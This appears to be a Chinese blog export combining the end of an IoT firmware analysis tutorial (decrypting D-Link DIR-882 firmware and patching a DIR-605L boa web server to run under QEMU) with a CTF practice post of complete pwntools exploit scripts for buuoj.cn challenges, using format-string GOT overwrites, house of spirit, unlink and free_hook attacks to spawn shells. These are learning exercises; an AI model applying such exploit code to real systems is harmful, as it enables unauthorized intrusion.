<li>出厂时的固件已经加密，供应商决定更改高版本固件的加密方式，并发布了包含解密例程的使用原加密方式加密的过渡版本v1.3<br>
这种方案对获取解密例程的难度较大，可从硬件中直接提取固件或对发布的v1.3进行分析</li>
</ul>
<p>DIR-882的固件发布方案为第一种，示意图如下<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624781752755.png" alt="1624781752755"></p>
<p><em>虽然个人认为第三种方案才是较为常见的，但教程中并没有讲到。猜测除了从硬件中提取外，还可以通过模拟器模拟然后进行patch或拿头还原</em></p>
<h2 id="解密过程">解密过程</h2>
<p>用binwalk分析最新和最早的两个固件<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624781656552.png" alt="1624781656552"></p>
<p>经过binwalk分析，FW104B02正是存在解密程序的中间版本（从文件名也能看出）</p>
<blockquote>
<p>对于判断固件是否被加密/混淆还可以使用之前提到的binwalk -E 来查看文件各个区域的熵值</p>
</blockquote>
<p>提取该固件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">binwalk -eM DIR882A1_FW104B02_Middle_FW_Unencrypt.bin  </span><br></pre></td></tr></table></figure>
<p>在最终目录下搜索找到imgdecrypt，从名字看出是下个版本固件的解密例程<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624790960410.png" alt="1624790960410"></p>
<p>可以静态分析程序的解密算法，也可以直接运行程序来对加密固件进行解密。</p>
<p>在本地运行时依旧需要借助qemu-mipsel-static模拟器，使用方法和上一节的模拟过程类似，不表。</p>
<p>利用imgdecrypt还可以还原出ftp服务器上提供的最新的固件，所以可能后续版本和Dlink其它型号的路由器也能用这个程序还原固件？Orz</p>
<h1>0x5 修复固件运行环境</h1>
<p>有一些固件因为硬件依赖等原因导致qemu和firmadyne之类的软件无法正确模拟</p>
<p>比如下面这个</p>
<blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ftp://ftp2.dlink.com/PRODUCTS/DIR-605L/REVA/DIR-605L_FIRMWARE_1.13.ZIP</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624798081527.png" alt="1624798081527"></p>
<blockquote>
<p>模拟固件运行的实质其实就是把固件的Web程序跑起来，而模拟失败则说明Web程序运行出错了，我们接下来就要看看Web程序报错的原因以及如何修复运行环境。</p>
</blockquote>
<h2 id="尝试运行固件">尝试运行固件</h2>
<p>首先binwalk提取固件，进入文件系统目录squashfs-root-0</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624842375040.png" alt="1624842375040"></p>
<p>找到web服务程序Boa</p>
<blockquote>
<p>Boa程序是一个轻量级的web服务器程序，常见于嵌入式系统中。dlink就是在boa开源代码的基础上新增了很多功能接口以实现路由器上的不同功能。boa程序的路径为/bin/boa，同时我们发现在/etc/boa路径下还有个boa的密码配置文件，我们可以直接获取到boa加密后的密码。</p>
</blockquote>
<p>用qemu-mips-static运行，结果产生了段错误</p>
<blockquote>
<p>mips 是32位大端字节序</p>
<p>mipsel 是32位小端字节序</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624843310448.png" alt="1624843310448"></p>
<h2 id="分析错误并修复">分析错误并修复</h2>
<blockquote>
<p>注：APMIB 是个Realtek的玩意（原来realtek还有做路由器相关的东西…）</p>
<ul>
<li>apmib_init(), 從 flash 讀出 mib 值寫入 RAM		–<span class="exturl" data-url="aHR0cHM6Ly9qeWhzaGluLnBpeG5ldC5uZXQvYmxvZy9wb3N0LzQ3MTYyMDAy">Realtek apmib library @ 邱小新の工作筆記 <i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>有些CVE（如CVE-2019-19823）就跟APMIB有关		–<span class="exturl" data-url="aHR0cHM6Ly9zcGxvaXQudGVjaC8yMDE5LzEyLzE2L1JlYWx0ZWstVE9UT0xJTksuaHRtbA==">TOTOLINK and other Realtek SDK based routers - full takeover (sploit.tech)<i class="fa fa-external-link-alt"></i></span></p>
<p>MIB：management information base，与SNMP有关，可在维基里进一步了解：<span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTWFuYWdlbWVudF9pbmZvcm1hdGlvbl9iYXNl">Management information base - Wikipedia<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>由于没有flash，导致读mib失败</p>
<p>拖到反编译工具中分析。先定位到字符串“Initialize AP MIB failed!”的位置。注意到在输出这个字符串前有个调用APMIB初始化的跳转，在此下断点，IDA远程调试</p>
<p>QEMU的远程调试不需要gdbserver，-g 指定端口，ida 远程调试选项指定相应端口就行<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624891866217.png" alt="1624891866217"><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624891907810.png" alt="1624891907810"></p>
<p>简单调试后发现，程序进入APMIB初始化函数后将返回值赋给v0，返回后对返回值进行判断。（跟着教程做完后，发现其实用静态分析看的就很明显，但多调试总是没有坏处的嘛）</p>
<p>跳转回去的位置在这：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624898602074.png" alt="1624898602074"></p>
<p>我们先试试看把原来的跳转patch一下能不能运行正常固件boa。</p>
<p>有以下两个可行方案：</p>
<ol>
<li>hxd（或其他二进制编辑器），把benz（0x14，不为0跳转）改为beqz（0x10，为0跳转）<br>
这个方法比较直接，定位到指令后把0x14改为0x10即可</li>
<li>Ghidra，把bne改为beq（Ghidra中反编译出的原指令为bne）</li>
</ol>
<ul>
<li><strong>如何用Ghidra进行patch并保存：</strong></li>
</ul>
<ol>
<li>下载python脚本<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NjaGxhZndhbmRsZXIvZ2hpZHJhX1NhdmVQYXRjaA==">ghidra_SavePatch<i class="fa fa-external-link-alt"></i></span> 并放到Ghidra存放python脚本的目录（找不到目录的话，如图）。<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624946914008.png" alt="1624946914008"></li>
<li>按照下图导入脚本。</li>
<li>patch<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624947011340.png" alt="1624947011340"></li>
<li>光标放在更改的指令，在script manager里运行脚本。</li>
</ol>
<p>参考：<span class="exturl" data-url="aHR0cHM6Ly9tYXRlcmlhbHMucmFuZ2Vmb3JjZS5jb20vdHV0b3JpYWwvMjAyMC8wNC8xMi9QYXRjaGluZy1CaW5hcmllcy8=">Patching Binaries With Ghidra – RangeForce<i class="fa fa-external-link-alt"></i></span></p>
<ul>
<li><strong>不用ida的原因：</strong></li>
</ul>
<p>把patch保存到文件中时，发现报错，稍微搜了一下，依然不知道是啥原因orz</p>
<blockquote>
<p>418228: has no file mapping (original: 14 patched: 10)…skipping…</p>
</blockquote>
<p>再次运行试试，发现又报错了：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624968893594.png" alt="1624968893594"></p>
<p>再放到Ghidra里分析，依旧通过字符串定位错误触发点。<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624969614083.png" alt="1624969614083"></p>
<p>两个函数（调用的地方位于websAspInit）里的报错由open函数造成（图为create_chklist_file()，但两个报错类似，均为一开始打开某个文件出错）<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624972065509.png" alt="1624972065509"></p>
<p>用IDA调试发现报错后仍然继续运行，异常发生在执行apmib_get()时：<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624973987614.png" alt="1624973987614"></p>
<p>具体在0x4084c9b0时，把[0+v0]里的值赋给v1，而0x1001明显是一个访问不了的地址<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624975561050.png" alt="1624975561050"><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624976989927.png" alt="1624976989927"></p>
<p>查一下apmib_get是干啥的。似乎是用来获取硬件配置信息，但我们要想让固件跑起来可以不需要这个。那么直接把获得apmib_get入口后的跳转语句nop掉<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624977950116.png" alt="1624977950116"></p>
<p>重新尝试运行<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624982108789.png" alt="1624982108789"><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624978566220.png" alt="1624978566220"></p>
<p>固件会一直尝试朝 ioctl（设备驱动的控制接口）发送0x89f0（应该是一个SIOCDEVPRIVATE），我们模拟的固件并不支持，但没啥大影响。（用Google搜一下“Unsupported ioctl: cmd=0x89f0”可以找到一些蛮有意思的东西2333）</p>
<blockquote>
<p>关于ioctl：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NoYW5zaGFucHQvYXJ0aWNsZS9kZXRhaWxzLzE5ODk3ODk3">ioctl()函数详解_shanshanpt的专栏-CSDN博客<i class="fa fa-external-link-alt"></i></span></p>
</blockquote>
<p>查看报错的页面（用vim看代码舒服一些），嗯，前端的东西：</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624982335259.png" alt="1624982335259"></p>
<p>从文件名可以猜到是个跟路由器界面语言选择有关的文件。</p>
<p>文件不长，注意到有个函数跟语言和硬件有关：</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624982776036.png" alt="1624982776036"></p>
<p>那么我们可以不让它运行到这个页面。</p>
<p>查找调用了*LangSelect.asp的页面，发现只有一个first.asp<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624984447102.png" alt="1624984447102"><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624984569909.png" alt="1624984569909"></p>
<p><em>SC是哪的LangCode，哪位大兄弟查到了的话麻烦告诉我一下</em></p>
<p>直接修改，重新运行完事<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/1624984880272.png" alt="1624984880272"></p>
<blockquote>
<p>这个固件成功运行后可以顺便看一看这个洞： <span class="exturl" data-url="aHR0cHM6Ly93aWtpLjk2Lm1rL0lPVCVFNSVBRSU4OSVFNSU4NSVBOC9ELUxpbmsvJUVGJUJDJTg4Q1ZFLTIwMTgtMjAwNTclRUYlQkMlODlELUxpbmslMjBESVItNjE5TCUyNjYwNUwlMjAlRTUlOTElQkQlRTQlQkIlQTQlRTYlQjMlQTglRTUlODUlQTUlRTYlQkMlOEYlRTYlQjQlOUUv">（CVE-2018-20057）D-Link DIR-619L&amp;605L 命令注入漏洞 - Wiki <i class="fa fa-external-link-alt"></i></span> ，直接用了后门</p>
</blockquote>
<p>这节的错误解决方法均通过修改指令，《路由器0day》书中的方法是伪造.so来劫持函数，也值得一学：<span class="exturl" data-url="aHR0cHM6Ly9wMWtrLmdpdGh1Yi5pby8yMDIwLzA0LzE1LyVFOCVCNyVBRiVFNyU5NCVCMSVFNSU5OSVBOC8lRTglQjclQUYlRTclOTQlQjElRTUlODglODYlRTYlOUUlOTAv">分析固件第一步<i class="fa fa-external-link-alt"></i></span></p>
<h1>0x6 结束</h1>
<p>感觉算是一个很不错的IoT固件分析入门教程，今天收到《路由器0day》后在路上粗略地看了下目录，除了专门的漏洞分析外，这个教程差不多把纯固件分析的要点都涉及到了（至于是不是 a bit out of date 就另当别论，不过感觉也还好⑧）</p>
]]></content>
      <tags>
        <tag>IoT</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn刷题</title>
    <url>/26324.html</url>
    <content><![CDATA[<p>把之前记的一些题目汇总了一下，没有任何顺序，好像也不是很全…</p>
<span id="more"></span>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5MzQzMjAxL2FydGljbGUvZGV0YWlscy82NjQ3MzE0MA==">堆相关漏洞利用libc异常提示原因记录_jmp esp-CSDN博客<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="wdb-2018-2nd-easyfmt">wdb_2018_2nd_easyfmt</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">p = process(&quot;./fmt&quot;)</span><br><span class="line">p = remote(&quot;node4.buuoj.cn&quot;,27907)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">elf = ELF(&quot;./fmt&quot;)</span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line">printfgot = elf.got[&#x27;printf&#x27;]</span><br><span class="line"></span><br><span class="line">print p.recv()</span><br><span class="line">p.sendline(p32(printfgot)+&quot;%6$s&quot;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line">#pause()</span><br><span class="line">#print p.recv()</span><br><span class="line">print p.recv(4)</span><br><span class="line"></span><br><span class="line">#printf = u32(p.recvuntil(&#x27;\xf7&#x27;)[-4:])</span><br><span class="line">printf = u32(p.recv(4))</span><br><span class="line">print hex(printf)</span><br><span class="line">#libc = DynELF(leak,elf=elf_)</span><br><span class="line">libc=LibcSearcher(&quot;printf&quot;,printf)</span><br><span class="line">#ubuntu-xenial-amd64-libc6-i386 (id libc6-i386_2.23-0ubuntu10_amd64)</span><br><span class="line">system = printf - libc.dump(&quot;printf&quot;) + libc.dump(&quot;system&quot;)</span><br><span class="line"></span><br><span class="line">#system = printf - libc.sym[&#x27;printf&#x27;] + libc.sym[&#x27;system&#x27;]</span><br><span class="line">success(hex(system))</span><br><span class="line">#print_addr = </span><br><span class="line"></span><br><span class="line">## useful tool:</span><br><span class="line">payload = fmtstr_payload(6,&#123;printfgot: system&#125;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(0)</span><br><span class="line">p.sendline(&quot;/bin/sh\x00&quot;)</span><br><span class="line">sleep(0)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="ZJCTF-2019-EasyHeap">[ZJCTF 2019]EasyHeap</h2>
<p>文件和Hitcon Lab 14一样，但buu的环境里/home/ctf是空的，改用house of spirit</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./easyheap&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">28283</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./easyheap&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Size of Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Content of heap:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,size,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Heap : &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">	p.sendafter(<span class="string">&quot;heap : &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index :&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">back</span>():</span></span><br><span class="line">	p.sendline(<span class="string">&quot;4869&quot;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x6020e8</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">&quot;aaa&quot;</span>)	<span class="comment">#0</span></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">&quot;bbbb&quot;</span>)	<span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">&quot;cccc&quot;</span>)	<span class="comment">#2</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">&quot;a&quot;</span>*<span class="number">0x58</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>) + p64(<span class="number">0x6020a0</span>-<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload1),payload1)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x60</span>,<span class="string">&quot;9&quot;</span>)</span><br><span class="line">payload2 = p64(<span class="number">9</span>)*<span class="number">6</span> + <span class="string">&quot;\x00&quot;</span>*<span class="number">3</span> + p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload2),payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>还有一种做法：<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTY3NzczMS9hcnRpY2xlL2RldGFpbHMvMTA4MjA0MjQ0">buuctf [ZJCTF 2019]EasyHeap_R1nd0的博客-CSDN博客<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh=process(<span class="string">&quot;./easyheap&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./easyheap&quot;</span>)</span><br><span class="line">free_got=elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">ptr=<span class="number">0x6020e8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Content of heap:&quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, size, content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Size of Heap : &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Content of heap : &quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(ptr-<span class="number">0x18</span>)+p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">payload+=p64(<span class="number">0x20</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)	<span class="comment">#heaparray&#x27;s chunk#1_ptr changed</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(free_got)</span><br><span class="line">payload+=p64(ptr-<span class="number">0x18</span>)+p64(ptr+<span class="number">0x10</span>)+<span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line"><span class="comment">#fake_chunk in bss</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">8</span>,p64(system_plt))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="ZJCTF-2019-Login">[ZJCTF 2019]Login</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./login&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29972</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;username: &quot;</span>,<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">passwd = <span class="string">&quot;2jctf_pa5sw0rd&quot;</span></span><br><span class="line">back = <span class="number">0x400E88</span></span><br><span class="line">payload = passwd + <span class="string">&quot;\x00&quot;</span>*(<span class="number">0x48</span>-<span class="built_in">len</span>(passwd)) + p64(back)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="wdb-2018-1st-babyheap">wdb_2018_1st_babyheap</h2>
<ol>
<li>uaf泄露堆地址</li>
<li>伪造chunk触发unlink，泄露main_arena+0x58的地址</li>
<li>计算free_hook和system地址，写入free_hook</li>
<li>触发free(“/bin/sh”)，getshell</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./w&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29942</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendafter(<span class="string">&quot;Content&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Choice:&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Index:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendafter(<span class="string">&quot;Content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment">#sleep(4)</span></span><br><span class="line">allocate(<span class="number">0</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>))*<span class="number">2</span>)</span><br><span class="line">allocate(<span class="number">1</span>,<span class="string">&quot;bbbb\n&quot;</span>)</span><br><span class="line">allocate(<span class="number">2</span>,<span class="string">&quot;cccc\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">3</span>,<span class="string">&quot;dddd\n&quot;</span>)</span><br><span class="line">allocate(<span class="number">4</span>,<span class="built_in">str</span>(<span class="string">&quot;/bin/sh\n&quot;</span>))</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">heap = u64(p.recvline()[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x30</span></span><br><span class="line"></span><br><span class="line">success(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x602060</span></span><br><span class="line">edit(<span class="number">0</span>,p64(heap+<span class="number">0x10</span>)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">5</span>, p64(<span class="number">0</span>)+p64(<span class="number">0x31</span>)+p64(heap)+p64(bss-<span class="number">0x10</span>))	<span class="comment">#chunk0</span></span><br><span class="line"></span><br><span class="line">allocate(<span class="number">6</span>, p64(bss-<span class="number">0x18</span>)+p64(bss-<span class="number">0x10</span>)+p64(<span class="number">0x20</span>)+p64(<span class="number">0x90</span>))<span class="comment"># pre_chunk == 0x20, the_hunk == 0x90</span></span><br><span class="line">allocate(<span class="number">7</span>, p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(bss-<span class="number">0x18</span>)+p64(bss-<span class="number">0x10</span>))	<span class="comment"># build chunk1</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)	<span class="comment">#unlink</span></span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">mallochook = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))- <span class="number">0x68</span></span><br><span class="line"><span class="comment">#(0x00007f5a6e089b78 - 0x00007f5a6e089b10)</span></span><br><span class="line">success(<span class="built_in">hex</span>(mallochook))</span><br><span class="line">libc.address = mallochook - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">freehook = libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">sys = libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span> + p64(freehook))</span><br><span class="line">edit(<span class="number">0</span>,p64(sys)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Hitcon-Training-Lab14">Hitcon Training Lab14</h2>
